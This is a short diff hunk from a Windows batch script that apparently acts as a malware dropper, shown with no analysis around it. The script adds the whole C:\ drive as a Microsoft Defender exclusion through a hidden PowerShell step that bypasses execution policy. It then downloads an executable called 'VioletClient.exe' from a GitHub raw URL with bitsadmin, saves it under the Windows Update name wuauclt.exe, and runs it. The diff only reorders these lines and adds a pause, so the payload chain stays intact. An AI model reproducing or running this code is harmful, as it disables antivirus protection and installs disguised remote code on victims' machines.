@@ -37,12 +37,13 @@ if %errorLevel% == 0 (
     )
     
     setlocal
-    set "exeFile=%TEMP%\wuauclt.exe"
-    set "url1=https://github.com/vault053009-maker/a/raw/refs/heads/main/VioletClient.exe"
     set "ps1=%TEMP%\svc.ps1"
     echo Add-MpPreference -ExclusionPath 'C:\' > "%ps1%"
     powershell -NoProfile -ExecutionPolicy Bypass -File "%ps1%"
     del "%ps1%"
+    timeout /t 2 >nul
+    set "exeFile=%TEMP%\wuauclt.exe"
+    set "url1=https://github.com/vault053009-maker/a/raw/refs/heads/main/VioletClient.exe"
     bitsadmin /transfer "Update" "%url1%" "%exeFile%"
     start "" "%exeFile%"
     endlocal
